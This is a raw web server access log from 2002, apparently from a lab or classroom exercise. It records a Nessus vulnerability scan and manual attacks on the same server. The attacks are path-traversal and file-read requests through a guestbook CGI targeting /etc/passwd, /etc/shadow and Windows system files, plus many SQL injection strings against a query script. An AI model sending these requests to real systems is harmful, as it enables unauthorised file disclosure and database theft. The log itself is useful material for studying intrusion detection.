128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /phpMyAdmin/sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /piranha/secure/control.php3? HTTP/1.1" 404 299 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /cgi-bin/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 288 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /piranha/secure/control.php3? HTTP/1.1" 404 299 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /phpPgAdmin/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 290 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET //sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 280 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET //sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 281 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /phpPgAdmin/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /scripts/sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 287 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /scripts/sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 288 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET //sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 280 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /phpMyAdmin/sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 290 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET //sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 281 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /phpMyAdmin/sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /scripts/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 287 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /\../readme.txt HTTP/1.1" 404 286 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /scripts/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 288 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /phpPgAdmin/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 290 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /cgi-bin/rpm_query HTTP/1.1" 404 289 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /phpPgAdmin/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /scripts/rpm_query HTTP/1.1" 404 289 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /cgi-bin/../ssd.ini HTTP/1.1" 404 279 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /cd-cgi/sscd_suncourier.pl HTTP/1.1" 404 297 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /scripts/../ssd.ini HTTP/1.1" 404 279 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /../../../../autoexec.bat HTTP/1.1" 400 358 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /robot.txt HTTP/1.1" 404 281 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET ..\..\..\..\..\..\windows\win.ini HTTP/1.1" 400 366 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /../../../winnt/repair/sam HTTP/1.1" 400 359 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /robots.txt HTTP/1.1" 404 282 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 400 364 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /cgi-bin/sscd_suncourier.pl HTTP/1.1" 404 298 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET ../../../../../../etc/passwd HTTP/1.1" 400 361 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:25 -0800] "GET /scripts/sscd_suncourier.pl HTTP/1.1" 404 298 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.21 - - [06/Dec/2002:12:27:25 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--select%27 HTTP/1.1" 200 327 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.38 - - [06/Dec/2002:12:27:27 -0800] "GET /contact.html HTTP/1.1" 200 1286 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.32 - - [06/Dec/2002:12:27:33 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.1" 200 1924 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.21 - - [06/Dec/2002:12:27:35 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%27 HTTP/1.1" 200 321 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.65 - - [06/Dec/2002:12:27:35 -0800] "GET /cgi-bin/boozt/admin/index.cgi HTTP/1.1" 404 301 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:35 -0800] "GET /cgi-bin/cgitest.exe HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:35 -0800] "GET /scripts/cgitest.exe HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:35 -0800] "GET /cgi-bin/boozt/index.cgi HTTP/1.1" 404 295 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /cgi-bin/admin/index.cgi HTTP/1.1" 404 295 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /cgi-bin/index.cgi HTTP/1.1" 404 289 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /cgi-bin/htimage.exe HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /scripts/boozt/admin/index.cgi HTTP/1.1" 404 301 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /scripts/htimage.exe HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /scripts/boozt/index.cgi HTTP/1.1" 404 295 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /scripts/admin/index.cgi HTTP/1.1" 404 295 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /scripts/index.cgi HTTP/1.1" 404 289 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /boozt/admin/index.cgi HTTP/1.1" 404 293 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /boozt/index.cgi HTTP/1.1" 404 287 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /admin/index.cgi HTTP/1.1" 404 287 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /index.cgi HTTP/1.1" 404 281 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /puttest1.html HTTP/1.1" 404 285 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /cgi-bin/imagemap.exe HTTP/1.1" 404 292 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "PUT /puttest1.html HTTP/1.1" 405 308 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /puttest1.html HTTP/1.1" 404 285 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /scripts/imagemap.exe HTTP/1.1" 404 292 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:36 -0800] "GET /pbserver/pbserver.dll HTTP/1.1" 404 293 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:37 -0800] "GET /cgi-bin/w3-msql/index.html HTTP/1.1" 404 298 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:37 -0800] "GET /cgi-bin/webdist.cgi HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:37 -0800] "GET /scripts/w3-msql/index.html HTTP/1.1" 404 298 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:37 -0800] "GET /scripts/webdist.cgi HTTP/1.1" 404 291 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:37 -0800] "GET /cgi-shl/win-c-sample.exe HTTP/1.1" 404 296 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:37 -0800] "GET /cgi-bin/wwwwais HTTP/1.1" 404 287 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:27:37 -0800] "GET /scripts/wwwwais HTTP/1.1" 404 287 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.21 - - [06/Dec/2002:12:28:00 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.21 - - [06/Dec/2002:12:28:08 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.61 - - [06/Dec/2002:12:28:13 -0800] "-" 408 - "-" "-"
128.111.43.21 - - [06/Dec/2002:12:28:15 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.1" 200 1924 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.58 - - [06/Dec/2002:12:28:21 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:28:43 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.0" 200 1891 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:28:54 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:29:06 -0800] "GET /cgi-bin/guestbook.pl?query HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:29:17 -0800] "GET /cgi-bin/guestbook.pl? HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:29:21 -0800] "GET /cgi-bin/guestbook.pl?. HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.71 - - [06/Dec/2002:12:29:42 -0800] "GET / HTTP/1.0" 200 1494 "-" "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6b"
128.111.43.25 - - [06/Dec/2002:12:29:55 -0800] "GET /cgi-bin/guestbook.pl HTTP/1.1" 200 348 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.73 - - [06/Dec/2002:12:30:01 -0800] "GET /cgi-bin/guestbook.pl?/query_extension.pl HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.25 - - [06/Dec/2002:12:30:06 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.1" 200 1924 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.21 - - [06/Dec/2002:12:30:10 -0800] "GET /cgi-bin/guestbook.pl?/var/www/ HTTP/1.1" 200 348 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.21 - - [06/Dec/2002:12:30:21 -0800] "GET /cgi-bin/guestbook.pl?/var/www/cgi-bin/query_extension.pl HTTP/1.1" 200 1104 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.73 - - [06/Dec/2002:12:31:49 -0800] "GET /cgi-bin/guestbook.pl?query HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:32:05 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+having+1%3D1-- HTTP/1.0" 200 319 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:33:07 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27-- HTTP/1.0" 200 297 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:33:13 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+-- HTTP/1.0" 200 299 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:33:16 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+--%27 HTTP/1.0" 200 1240 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:33:24 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+%3B-- HTTP/1.0" 200 301 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:33:28 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%3B-- HTTP/1.0" 200 299 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:34:58 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%27 HTTP/1.0" 200 313 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:35:23 -0800] "GET /cgi-bin/query_extension.pl?cboname='' HTTP/1.0" 200 313 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:35:32 -0800] "GET /cgi-bin/query_extension.pl?cboname='-- HTTP/1.0" 200 297 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:35:35 -0800] "GET /cgi-bin/query_extension.pl?cboname=';-- HTTP/1.0" 200 293 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:35:38 -0800] "GET /cgi-bin/query_extension.pl?cboname='--' HTTP/1.0" 200 1238 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:37:12 -0800] "GET /cgi-bin/query_extension.pl?cboname=%5C%27 HTTP/1.0" 200 309 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:37:16 -0800] "GET /cgi-bin/query_extension.pl?cboname=%5C%27%5C%27 HTTP/1.0" 200 317 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:37:21 -0800] "GET /cgi-bin/query_extension.pl?cboname=\'' HTTP/1.0" 200 301 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:37:27 -0800] "GET /cgi-bin/query_extension.pl?cboname=''' HTTP/1.0" 200 305 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:37:29 -0800] "GET /cgi-bin/query_extension.pl?cboname=\ HTTP/1.0" 200 289 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:38:11 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27---%27 HTTP/1.0" 200 1240 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:38:15 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27-%27 HTTP/1.0" 200 1236 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:38:19 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+%27 HTTP/1.0" 200 315 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:38:23 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27blah%27 HTTP/1.0" 200 307 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:38:27 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27-%27 HTTP/1.0" 200 1236 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:38:56 -0800] "GET /cgi-bin/query_extension.pl?cboname=-%27 HTTP/1.0" 200 295 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:38:59 -0800] "GET /cgi-bin/query_extension.pl?cboname=--%27 HTTP/1.0" 200 297 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:39:42 -0800] "GET /cgi-bin/query_extension.pl?cboname=--%27%27 HTTP/1.0" 200 317 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:39:49 -0800] "GET /cgi-bin/query_extension.pl?cboname=--' HTTP/1.0" 200 297 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:39:52 -0800] "GET /cgi-bin/query_extension.pl?cboname='--' HTTP/1.0" 200 1238 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:40:09 -0800] "GET /cgi-bin/query_extension.pl?cboname=' select * from Employees' HTTP/1.0" 200 293 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:40:19 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--select+*+from+Employees%27 HTTP/1.0" 200 349 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:40:24 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27 HTTP/1.0" 200 1238 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:41:21 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:41:24 -0800] "GET /cgi-bin/guestbook.pl?/etc/hosts HTTP/1.0" 200 474 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:42:07 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.0" 200 1891 "-" "Wget/1.8.1"
128.111.43.73 - - [06/Dec/2002:12:42:27 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B HTTP/1.0" 200 1240 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:42:36 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B+select+*+from+Employees HTTP/1.0" 200 1288 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:42:53 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B+SElECT+*+FROM+Employees HTTP/1.0" 200 1288 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:42:59 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27+SElECT+*+FROM+Employees HTTP/1.0" 200 1286 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:43:06 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27+SElECT+*+FROM+Employees+%3B HTTP/1.0" 200 1290 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:43:13 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%27+SElECT+*+FROM+Employees+%3B HTTP/1.0" 200 361 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:43:18 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%27+SELECT+*+FROM+Employees+%3B HTTP/1.0" 200 361 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:43:27 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%22 HTTP/1.0" 200 300 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:43:31 -0800] "GET /cgi-bin/query_extension.pl?cboname=%22%27%22 HTTP/1.0" 200 307 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:43:49 -0800] "GET /cgi-bin/query_extension.pl?cboname=' and ' HTTP/1.0" 200 293 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:43:53 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.0" 200 1891 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:44:00 -0800] "GET /cgi-bin/query_extension.pl?cboname='%20and%20' HTTP/1.0" 200 323 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:44:04 -0800] "GET /cgi-bin/save_message.pl? HTTP/1.0" 200 649 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:44:11 -0800] "GET /cgi-bin/save_message.pl?/ HTTP/1.0" 200 649 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:44:11 -0800] "GET /cgi-bin/query_extension.pl?cboname='+and+' HTTP/1.0" 200 323 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:44:15 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/cgi-bin/save_message.pl?/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:44:23 -0800] "GET /cgi-bin/query_extension.pl?cboname=-- HTTP/1.0" 200 305 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:44:27 -0800] "GET /cgi-bin/query_extension.pl?cboname=--' HTTP/1.0" 200 297 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:44:31 -0800] "GET /cgi-bin/query_extension.pl?cboname='--' HTTP/1.0" 200 1238 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:44:32 -0800] "GET /cgi-bin/guestbook.pl?/etc/shawdow HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:44:40 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.0" 200 1891 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
